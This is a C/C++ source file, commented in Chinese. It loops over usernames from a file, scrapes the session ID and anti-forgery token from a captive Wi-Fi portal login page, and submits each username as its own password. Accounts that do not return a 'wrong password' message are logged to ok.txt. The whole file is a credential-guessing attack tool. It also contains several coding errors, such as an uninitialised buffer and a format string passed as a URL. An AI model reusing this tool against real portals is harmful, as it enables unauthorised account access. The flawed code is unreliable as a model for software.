#include <stdio.h>
#include <string>
#include <curl/curl.h>

size_t process_data(void* buffer, size_t size, size_t nmemb, void* user_p)
{
	strcat_s((char*)user_p, MAX_PATH ,(char*)buffer);
	return size * nmemb;
}


int main(int argc, char* argv) {
	//初始化
	CURL* pEasyHandle = curl_easy_init();
	CURLcode code;
	FILE* fp;
	fopen_s(&fp,"ok.txt", "w"); //保存到ok.txt
	char* i;
	FILE* freopen;
	freopen_s(&freopen,"data.txt", "r", stdin); //有效用户名文件
	//freopen("ok.txt","w",stdout);
	while (scanf_s("%s", &i) == 1) //循环读取data.txt
	{
		printf_s("%s\n", i);
		curl_easy_setopt(pEasyHandle, CURLOPT_URL, "http://1.1.1.1:8080/portal.do?wlanuserip=172.17.30.197&wlanacname=system&mac=xx:xx:xx:xx:xx:xx&vlan=0&url=http://go.microsoft.com/fwlink/?LinkID=219472&clcid=0x409&rand=582e3a2b");
		curl_easy_setopt(pEasyHandle, CURLOPT_WRITEFUNCTION, &process_data);
		curl_easy_setopt(pEasyHandle, CURLOPT_TIMEOUT, 20);
		curl_easy_setopt(pEasyHandle, CURLOPT_FORBID_REUSE, 1);
		curl_easy_setopt(pEasyHandle, CURLOPT_COOKIEFILE, "cookie.txt");
		char szRet[100000] = { 0 };
		curl_easy_setopt(pEasyHandle, CURLOPT_WRITEHEADER, szRet);
		curl_easy_setopt(pEasyHandle, CURLOPT_WRITEDATA, szRet);
		code = curl_easy_perform(pEasyHandle);
		//printf("%s\n",szRet);
		std::string ret = szRet; //返回数据
		int pos1 = ret.find("JSESSIONID="); //找到sessionid
		std::string session = ret.substr(pos1 + (INT)11, 32);
		int pos2 = ret.find("TOKEN\" value=\""); //找到token
		std::string token = ret.substr(pos2 + (INT)14, 32);
		std::string po;
		//模拟提交
		po = "org.apache.struts.taglib.html.TOKEN=" + token + "&wlanuserip=172.17.30.197&wlanacname=system&chal_id=&chal_vector=&auth_type=PAP&seq_id=&req_id=&wlanacIp=127.0.0.1&ssid=&mac=xx%%3A1e%%3A11%%3Aac%%3A00%%3A00&message=&bank_acct=&isCookies=&listpasscode=1&listgetpass=1&getpasstype=0&randstr=4692&domain=&version=0&authkey=&usertype=&url=http%%3A%%2F%%2Fgo.microsoft.com%%2Ffwlink%%2F%%3FLinkID%%3D219472&isHaveNotice=0&userid=" + i + "&passwd=" + i + "&submit=Login";
		//printf("\n\n\n%s\n\n",po.GetBuffer(0));
		//po.ReleaseBuffer();
		curl_easy_setopt(pEasyHandle, CURLOPT_POSTFIELDS, po);
		curl_easy_setopt(pEasyHandle, CURLOPT_URL, "http://1.1.1.1:8080/portalAuthAction.do;jsessionid=%s", session);
		curl_easy_setopt(pEasyHandle, CURLOPT_WRITEFUNCTION, &process_data);
		curl_easy_setopt(pEasyHandle, CURLOPT_TIMEOUT, 20);
		curl_easy_setopt(pEasyHandle, CURLOPT_FORBID_REUSE, 1);
		curl_easy_setopt(pEasyHandle, CURLOPT_COOKIEFILE, "cookie.txt");
		char szRet2[1024] = { 0 };
		curl_easy_setopt(pEasyHandle, CURLOPT_WRITEDATA, szRet2);
		code = curl_easy_perform(pEasyHandle);
		ret = szRet2; //返回数据
		if (ret.find("密码错误") == -1) //密码正确（可能是达到上限）
			fprintf(fp, "%d\n", i); //保存账号

//printf("%s\n",szRet2);
 /*  Sleep(sp);
        cnt++;
        if(cnt%10 == 0)
            printf("%d\n",cnt);*/
	}
	fclose(fp);
	curl_easy_cleanup(pEasyHandle);
	getchar();
	return 0;
}